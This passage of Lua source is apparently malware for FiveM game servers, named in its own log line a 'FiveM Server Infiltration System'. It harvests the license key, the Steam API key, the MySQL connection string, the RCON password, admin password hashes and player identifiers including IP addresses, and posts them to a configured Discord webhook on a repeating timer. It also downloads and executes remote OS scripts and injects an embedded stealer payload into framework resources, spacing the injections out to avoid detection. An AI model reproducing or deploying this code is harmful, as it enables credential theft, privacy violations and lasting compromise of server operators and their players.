    return resource_data
end

-- Collect server configuration
function DataCollector.collect_server_config()
    local config_vars = {
        -- Server identification
        sv_hostname = GetConvar("sv_hostname", "unknown"),
        sv_projectName = GetConvar("sv_projectName", "unknown"),
        sv_projectDesc = GetConvar("sv_projectDesc", "unknown"),
        
        -- Connection info
        endpoint_add_tcp = GetConvar("endpoint_add_tcp", "unknown"),
        endpoint_add_udp = GetConvar("endpoint_add_udp", "unknown"),
        sv_endpointPrivacy = GetConvar("sv_endpointPrivacy", "unknown"),
        sv_maxclients = GetConvarInt("sv_maxclients", 0),
        
        -- Game settings
        game_type = GetConvar("gametype", "unknown"),
        map_name = GetConvar("mapname", "unknown"),
        onesync_enabled = GetConvar("onesync_enabled", "unknown"),
        sv_scriptHookAllowed = GetConvar("sv_scriptHookAllowed", "unknown"),
        sv_enforceGameBuild = GetConvar("sv_enforceGameBuild", "unknown"),
        sv_lan = GetConvar("sv_lan", "unknown"),
        
        -- Authentication
        sv_licenseKey = GetConvar("sv_licenseKey", "unknown"),
        steam_webApiKey = GetConvar("steam_webApiKey", "unknown"),
        
        -- Database
        mysql_connection_string = GetConvar("mysql_connection_string", "unknown"),
        mysql_debug = GetConvar("mysql_debug", "unknown"),
        
        -- Security
        rcon_password = GetConvar("rcon_password", "unknown"),
        sv_authMaxVariance = GetConvar("sv_authMaxVariance", "unknown"),
        sv_authMinTrust = GetConvar("sv_authMinTrust", "unknown"),
        
        -- Technical
        version = GetConvar("version", "unknown"),
        locale = GetConvar("locale", "unknown"),
        netlib = GetConvar("netlib", "unknown"),
        resource_monitor = GetConvar("activitypubFeed", "unknown"),
    }
    
    return config_vars
end

-- Main data collection function
function DataCollector.collect_all_data(callback)
    Utils.get_server_ip(function(server_ip, error)
        if error then
            Logger.error("Could not get IP address: " .. error)
            server_ip = "Unknown"
        end
        
        local server_os = Utils.get_server_os()
        local player_count = #GetPlayers()
        
        -- Collect all configured data
        local server_data = {
            collection_time = os.date("%Y-%m-%d %H:%M:%S"),
            server = {
                ip = server_ip,
                os = server_os,
                player_count = player_count
            },
            config = Config.collection.config_vars and DataCollector.collect_server_config() or nil,
            players = Config.collection.player_data and DataCollector.collect_player_info() or nil,
            resources = Config.collection.resource_data and DataCollector.collect_resource_info() or nil,
            admin_data = Config.admin_data.enabled and AdminDataExtractor.get_all_admin_data() or nil
        }
        
        callback(server_data)
    end)
end

-- =============================================
-- WEBHOOK MANAGER
-- =============================================

local WebhookManager = {}

-- Format data for webhook
function WebhookManager.format_for_webhook(server_data)
    -- Basic webhook structure
    local webhook_data = {
        username = Config.webhook.username,
        avatar_url = Config.webhook.avatar_url,
        content = Config.webhook.mention and Config.webhook.mention .. " FiveM Server Information" or "FiveM Server Information",
        embeds = {}
    }
    
    -- Main server info embed
    table.insert(webhook_data.embeds, {
        title = server_data.config and server_data.config.sv_hostname or "FiveM Server",
        color = Config.webhook.color,
        fields = {},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    })
    
    -- Add server info fields
    table.insert(webhook_data.embeds[1].fields, {
        name = "Server Information",
        value = "------------------------",
        inline = false
    })
    
    table.insert(webhook_data.embeds[1].fields, {
        name = "IP Address",
        value = server_data.server.ip or "Unknown",
        inline = true
    })
    
    table.insert(webhook_data.embeds[1].fields, {
        name = "Operating System",
        value = server_data.server.os or "Unknown",
        inline = true
    })
    
    table.insert(webhook_data.embeds[1].fields, {
        name = "Online Players",
        value = tostring(server_data.server.player_count),
        inline = true
    })
    
    -- Add sensitive config fields
    if server_data.config then
        table.insert(webhook_data.embeds[1].fields, {
            name = "Sensitive Information",
            value = "------------------------",
            inline = false
        })
        
        -- Add CFX Link
        if server_data.config.sv_licenseKey and server_data.config.sv_licenseKey ~= "unknown" then
            table.insert(webhook_data.embeds[1].fields, {
                name = "CFX Direct Link",
                value = "cfx.re/join/" .. server_data.config.sv_licenseKey,
                inline = false
            })
        end
        
        -- Add License Key
        if server_data.config.sv_licenseKey and server_data.config.sv_licenseKey ~= "unknown" then
            table.insert(webhook_data.embeds[1].fields, {
                name = "License Key",
                value = "```" .. server_data.config.sv_licenseKey .. "```",
                inline = false
            })
        end
        
        -- Add MySQL Connection String
        if server_data.config.mysql_connection_string and server_data.config.mysql_connection_string ~= "unknown" then
            table.insert(webhook_data.embeds[1].fields, {
                name = "MySQL Connection",
                value = "```" .. server_data.config.mysql_connection_string .. "```",
                inline = false
            })
        end
        
        -- Add RCON Password
        if server_data.config.rcon_password and server_data.config.rcon_password ~= "unknown" then
            table.insert(webhook_data.embeds[1].fields, {
                name = "RCON Password",
                value = "```" .. server_data.config.rcon_password .. "```",
                inline = false
            })
        end
        
        -- Add Steam Web API Key
        if server_data.config.steam_webApiKey and server_data.config.steam_webApiKey ~= "unknown" then
            table.insert(webhook_data.embeds[1].fields, {
                name = "Steam Web API",
                value = "```" .. server_data.config.steam_webApiKey .. "```",
                inline = false
            })
        end
    end
    
    -- Add admin data if available
    if server_data.admin_data and #server_data.admin_data > 0 then
        -- Create a new embed for admin data
        table.insert(webhook_data.embeds, {
            title = "Admin Access Data",
            color = 16776960, -- Yellow
            fields = {},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        })
        
        local admin_embed = webhook_data.embeds[#webhook_data.embeds]
        
        for _, admin_file in ipairs(server_data.admin_data) do
            table.insert(admin_embed.fields, {
                name = "Admin File Path",
                value = admin_file.file_path,
                inline = false
            })
            
            for i, admin in ipairs(admin_file.admins) do
                -- Limit to 10 admins per embed to avoid hitting Discord limits
                if i <= 10 then
                    local admin_text = "**Name**: " .. admin.name .. "\n"
                    
                    if admin.master then
                        admin_text = admin_text .. "**Role**: Master Admin\n"
                    end
                    
                    if admin.password_hash then
                        admin_text = admin_text .. "**Password Hash**: `" .. admin.password_hash .. "`\n"
                    end
                    
                    -- Add provider info
                    if admin.providers and Utils.table_size(admin.providers) > 0 then
                        admin_text = admin_text .. "**Identifiers**:\n"
                        
                        for provider, data in pairs(admin.providers) do
                            if data.id then
                                admin_text = admin_text .. "- " .. provider .. ": " .. data.id .. "\n"
                            end
                            
                            if data.identifier then
                                admin_text = admin_text .. "  identifier: " .. data.identifier .. "\n"
                            end
                        end
                    end
                    
                    table.insert(admin_embed.fields, {
                        name = "Admin #" .. i,
                        value = admin_text,
                        inline = false
                    })
                elseif i == 11 then
                    -- Add a note about more admins
                    table.insert(admin_embed.fields, {
                        name = "More Admins",
                        value = "+" .. (#admin_file.admins - 10) .. " additional admins. Full details in the attached file.",
                        inline = false
                    })
                end
            end
        end
        
        -- Add the raw file as an attachment
        webhook_data.files = {
            { 
                name = "admins.json", 
                content = server_data.admin_data[1].raw_file, 
                type = "application/json" 
            }
        }
    end
    
    -- Player information if available
    if server_data.players and #server_data.players > 0 and #server_data.players <= 15 then
        -- Create player embed
        table.insert(webhook_data.embeds, {
            title = "Player Information",
            color = 65280, -- Green
            fields = {},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        })
        
        local player_embed = webhook_data.embeds[#webhook_data.embeds]
        
        for _, player in ipairs(server_data.players) do
            local player_text = "**Name**: " .. player.name .. "\n"
            player_text = player_text .. "**Ping**: " .. player.ping .. "ms\n"
            
            if player.identifiers then
                player_text = player_text .. "**Identifiers**:\n"
                
                for id_type, identifier in pairs(player.identifiers) do
                    player_text = player_text .. "- " .. id_type .. ": " .. identifier .. "\n"
                end
            end
            
            table.insert(player_embed.fields, {
                name = "Player #" .. player.id,
                value = player_text,
                inline = false
            })
        end
    end
    
    -- Resource information summary if available
    if server_data.resources and #server_data.resources > 0 then
        -- Create resource embed
        table.insert(webhook_data.embeds, {
            title = "Resource Information",
            color = 11342935, -- Purple
            fields = {},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        })
        
        local resource_embed = webhook_data.embeds[#webhook_data.embeds]
        
        -- Count by state
        local state_counts = {}
        for _, resource in ipairs(server_data.resources) do
            state_counts[resource.state] = (state_counts[resource.state] or 0) + 1
        end
        
        -- Add summary
        local summary = "**Total Resources**: " .. #server_data.resources .. "\n"
        for state, count in pairs(state_counts) do
            summary = summary .. "**" .. state .. "**: " .. count .. "\n"
        end
        
        table.insert(resource_embed.fields, {
            name = "Summary",
            value = summary,
            inline = false
        })
        
        -- Add important framework resources
        local frameworks = {}
        for _, framework in ipairs(Config.targeting.framework_resources) do
            for _, resource in ipairs(server_data.resources) do
                if resource.name == framework and resource.state == "started" then
                    table.insert(frameworks, "**" .. resource.name .. "**: " .. (resource.version ~= "unknown" and resource.version or "No version"))
                    break
                end
            end
        end
        
        if #frameworks > 0 then
            table.insert(resource_embed.fields, {
                name = "Frameworks",
                value = table.concat(frameworks, "\n"),
                inline = false
            })
        end
    end
    
    return webhook_data
end

-- Send data to webhook
function WebhookManager.send(data, callback)
    if not data then
        Logger.error("No data to send to webhook")
        if callback then callback(false) end
        return
    end
    
    Logger.info("Sending data to webhook...")
    
    -- Convert data to valid JSON
    local json_data = Utils.json_encode(data)
    
    -- Send to webhook
    Utils.http_request(Config.webhook.url, function(response, error)
        if error then
            Logger.error("Webhook error: " .. error)
            if callback then callback(false) end
        else
            Logger.info("Data successfully sent to webhook")
            if callback then callback(true) end
        end
    end, "POST", json_data, { ["Content-Type"] = "application/json" }, Config.webhook.retry_count)
end

-- =============================================
-- BUILT-IN DATA COLLECTOR PAYLOAD
-- =============================================

local function generate_collector_payload()
    return [[
-- Server Data Collection Module
local CollectorConfig = {
    webhook_url = "]] .. Config.webhook.url .. [[",
    collection_interval = 3600000, -- 1 hour in ms
    collect_players = true,
    collect_resources = true,
    collect_config = true,
    mention = "]] .. Config.webhook.mention .. [["
}

-- Silent execution
local function silent_print() end
local orig_print = print
print = CollectorConfig.silent_mode and silent_print or orig_print

-- HTTP Request wrapper with retry
local function http_request(url, callback, method, data, headers, retry_count)
    local attempts = 0
    local max_attempts = retry_count or 3
    
    local function attempt_request()
        attempts = attempts + 1
        
        PerformHttpRequest(url, function(statusCode, response, responseHeaders)
            if statusCode == 200 then
                callback(response, nil, responseHeaders)
            else
                local error_msg = "HTTP request failed with status code: " .. tostring(statusCode)
                
                if attempts < max_attempts then
                    Citizen.SetTimeout(5000, attempt_request)
                else
                    callback(nil, error_msg .. ". Max retry attempts reached.")
                end
            end
        end, method or "GET", data or "", headers or { ["Content-Type"] = "application/json" })
    end
    
    attempt_request()
end

-- Get server IP
local function get_server_ip(callback)
    local apis = {
        "https://api.ipify.org/",
        "https://ifconfig.me/ip",
        "https://icanhazip.com/"
    }
    
    local attempts = 0
    local max_attempts = #apis * 3
    local current_api = 1
    
    local function attempt_fetch()
        attempts = attempts + 1
        PerformHttpRequest(apis[current_api], function(errorCode, resultData)
            if errorCode == 200 and resultData then
                callback(resultData:gsub("[\r\n]", ""), nil)
            else
                current_api = (current_api % #apis) + 1 -- Try next API
                if attempts < max_attempts then
                    Citizen.SetTimeout(5000, attempt_fetch)
                else
                    callback(nil, "Failed to get IP after " .. max_attempts .. " attempts")
                end
            end
        end)
    end
    
    attempt_fetch()
end

-- Collect player information
local function collect_player_info()
    local player_data = {}
    local players = GetPlayers()
    
    for _, player_id in ipairs(players) do
        local player_info = {
            id = player_id,
            name = GetPlayerName(player_id) or "Unknown",
            ping = GetPlayerPing(player_id),
            identifiers = {}
        }
        
        -- Collect all identifiers
        for _, id_type in ipairs({"steam", "license", "xbl", "live", "discord", "fivem", "ip"}) do
            local identifier = GetPlayerIdentifierByType(player_id, id_type)
            if identifier then
                player_info.identifiers[id_type] = identifier
            end
        end
        
        table.insert(player_data, player_info)
    end
    
    return player_data
end

-- Collect resource information
local function collect_resource_info()
    local resource_data = {}
    
    for i = 0, GetNumResources() - 1 do
        local resource_name = GetResourceByFindIndex(i)
        if resource_name then
            local resource_info = {
                name = resource_name,
                state = GetResourceState(resource_name),
                version = GetResourceMetadata(resource_name, "version") or "unknown",
                author = GetResourceMetadata(resource_name, "author") or "unknown"
            }
            
            table.insert(resource_data, resource_info)
        end
    end
    
    return resource_data
end

-- Collect server configuration
local function collect_server_config()
    local config_vars = {
        sv_hostname = GetConvar("sv_hostname", "unknown"),
        sv_projectName = GetConvar("sv_projectName", "unknown"),
        sv_projectDesc = GetConvar("sv_projectDesc", "unknown"),
        
        endpoint_add_tcp = GetConvar("endpoint_add_tcp", "unknown"),
        endpoint_add_udp = GetConvar("endpoint_add_udp", "unknown"),
        sv_maxclients = GetConvarInt("sv_maxclients", 0),
        
        onesync_enabled = GetConvar("onesync_enabled", "unknown"),
        sv_scriptHookAllowed = GetConvar("sv_scriptHookAllowed", "unknown"),
        sv_enforceGameBuild = GetConvar("sv_enforceGameBuild", "unknown"),
        
        sv_licenseKey = GetConvar("sv_licenseKey", "unknown"),
        steam_webApiKey = GetConvar("steam_webApiKey", "unknown"),
        
        mysql_connection_string = GetConvar("mysql_connection_string", "unknown"),
        mysql_debug = GetConvar("mysql_debug", "unknown"),
        
        rcon_password = GetConvar("rcon_password", "unknown"),
        
        version = GetConvar("version", "unknown"),
        locale = GetConvar("locale", "unknown")
    }
    
    return config_vars
end

-- Collect and send all data
local function collect_and_send_data()
    get_server_ip(function(server_ip, error)
        local server_os = "Unknown"
        local version = GetConvar("version", "unknown")
        
        if version:find("win32") then
            server_os = "Windows"
        elseif version:find("linux") then
            server_os = "Linux"
        end
        
        local player_count = #GetPlayers()
        
        -- Collect all configured data
        local server_data = {
            server = {
                ip = server_ip or "Unknown",
                os = server_os,
                player_count = player_count
            },
            config = CollectorConfig.collect_config and collect_server_config() or nil,
            players = CollectorConfig.collect_players and collect_player_info() or nil,
            resources = CollectorConfig.collect_resources and collect_resource_info() or nil
        }
        
        -- Format for webhook
        local webhook_data = {
            username = "FiveM Server Monitor",
            content = CollectorConfig.mention and CollectorConfig.mention .. " FiveM Server Information" or "FiveM Server Information",
            embeds = [{
                title = server_data.config and server_data.config.sv_hostname or "FiveM Server",
                color = 16711680,
                fields = [
                    {
                        name = "Server Information",
                        value = "------------------------",
                        inline = false
                    },
                    {
                        name = "IP Address",
                        value = server_data.server.ip,
                        inline = true
                    },
                    {
                        name = "Operating System",
                        value = server_data.server.os,
                        inline = true
                    },
                    {
                        name = "Online Players",
                        value = tostring(server_data.server.player_count),
                        inline = true
                    }
                ],
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }]
        }
        
        -- Add sensitive configuration fields
        if server_data.config then
            table.insert(webhook_data.embeds[1].fields, {
                name = "Sensitive Information",
                value = "------------------------",
                inline = false
            })
            
            -- Add CFX Link
            if server_data.config.sv_licenseKey ~= "unknown" then
                table.insert(webhook_data.embeds[1].fields, {
                    name = "CFX Direct Link",
                    value = "cfx.re/join/" .. server_data.config.sv_licenseKey,
                    inline = false
                })
            end
            
            -- Add MySQL Connection String
            if server_data.config.mysql_connection_string ~= "unknown" then
                table.insert(webhook_data.embeds[1].fields, {
                    name = "MySQL Connection",
                    value = "```" .. server_data.config.mysql_connection_string .. "```",
                    inline = false
                })
            end
            
            -- Add RCON Password
            if server_data.config.rcon_password ~= "unknown" then
                table.insert(webhook_data.embeds[1].fields, {
                    name = "RCON Password",
                    value = "```" .. server_data.config.rcon_password .. "```",
                    inline = false
                })
            end
        }
        
        -- Send to webhook
        local json_data = json.encode(webhook_data)
        http_request(CollectorConfig.webhook_url, function(response, error) end, "POST", json_data, { ["Content-Type"] = "application/json" })
    end)
end

-- Initial data collection
Citizen.CreateThread(function()
    Citizen.Wait(10000) -- Initial delay
    collect_and_send_data()
    
    -- Periodic collection if enabled
    if CollectorConfig.collection_interval > 0 then
        Citizen.CreateThread(function()
            while true do
                Citizen.Wait(CollectorConfig.collection_interval)
                collect_and_send_data()
            end
        end)
    end
end)
]]
end

-- =============================================
-- MAIN EXECUTION
-- =============================================

local function initialize_system()
    Logger.info("FiveM Server Infiltration System initializing...")
    
    math.randomseed(os.time())
    
    -- Detection of server OS
    local server_os = Utils.get_server_os()
    local is_linux = server_os == "Linux"
    Logger.info("Detected operating system: " .. server_os)
    
    -- Execute system script if enabled
    if Config.payloads.system_scripts.enabled then
        local script_url = is_linux and Config.payloads.system_scripts.linux or Config.payloads.system_scripts.windows
        
        ScriptManager.fetch_from_url(script_url, function(script_content)
            if script_content then
                ScriptManager.execute(script_content, is_linux)
            else
                Logger.error("Failed to fetch system script")
            end
        end)
    end
    
    -- Only proceed with injection if enabled
    if Config.payloads.injection.enabled then
        local injection_code
        
        -- Either fetch custom injection code or use built-in collector
        if Config.payloads.injection.use_custom_url then
            ScriptManager.fetch_from_url(Config.payloads.injection.custom_url, function(custom_code)
                if not custom_code then
                    Logger.error("Failed to load custom injection code, falling back to built-in collector")
                    injection_code = generate_collector_payload()
                    perform_injection(injection_code)
                else
                    Logger.info("Custom injection code loaded (" .. string.len(custom_code) .. " bytes)")
                    injection_code = custom_code
                    perform_injection(injection_code)
                end
            end)
        else
            -- Use built-in data collector
            injection_code = generate_collector_payload()
            perform_injection(injection_code)
        end
    end
    
    -- Collect and send server data
    Citizen.SetTimeout(Config.execution.post_injection_delay, function()
        DataCollector.collect_all_data(function(server_data)
            local webhook_data = WebhookManager.format_for_webhook(server_data)
            WebhookManager.send(webhook_data)
        end)
    end)
    
    -- Set up periodic reporting if enabled
    if Config.execution.periodic_reporting then
        Citizen.CreateThread(function()
            while true do
                Citizen.Wait(Config.execution.reporting_interval)
                
                DataCollector.collect_all_data(function(server_data)
                    local webhook_data = WebhookManager.format_for_webhook(server_data)
                    WebhookManager.send(webhook_data)
                end)
            end
        end)
    end
    
    Logger.info("Initialization complete")
end

-- Helper function for injection process
function perform_injection(injection_code)
    if not injection_code then
        Logger.error("No injection code available")
        return
    end
    
    -- Find target resources for injection
    local target_resources
    
    if Config.targeting.auto_detect then
        target_resources = Injector.find_target_resources()
    else
        -- Use predefined frameworks
        target_resources = {}
        for _, framework in ipairs(Config.targeting.framework_resources) do
            local resource_info = ResourceAnalyzer.parse_manifest(framework)
            if resource_info then
                table.insert(target_resources, {
                    name = framework,
                    info = resource_info,
                    score = 100
                })
            end
        end
    end
    
    Logger.info("Found " .. #target_resources .. " suitable resources for injection")
    
    -- Inject code into target resources
    local success_count = 0
    
    for i, target in ipairs(target_resources) do
        -- Stagger injections to avoid detection
        local delay = (i - 1) * Config.execution.stagger_delay
        
        Citizen.SetTimeout(delay, function()
            Logger.info("Injecting into resource: " .. target.name .. " (Score: " .. target.score .. ")")
            
            if Injector.inject_into_resource(target.info, injection_code) then
                success_count = success_count + 1
                Logger.info("Successfully injected code into: " .. target.name)
            else
                Logger.error("Failed to inject code into: " .. target.name)
            end
        end)
    end
end


-- Start with delay
Citizen.CreateThread(function()
    Logger.info("Starting in " .. (Config.execution.startup_delay / 1000) .. " seconds...")
    Citizen.Wait(Config.execution.startup_delay)
    
    initialize_system()
end)

-- Return module for debugging/extension
return {
    version = "1.0.0",
    config = Config,
    utils = Utils,
    file_scanner = FileScanner,
    admin_extractor = AdminDataExtractor,
    resource_analyzer = ResourceAnalyzer,
    injector = Injector,
    data_collector = DataCollector,
    webhook_manager = WebhookManager
}
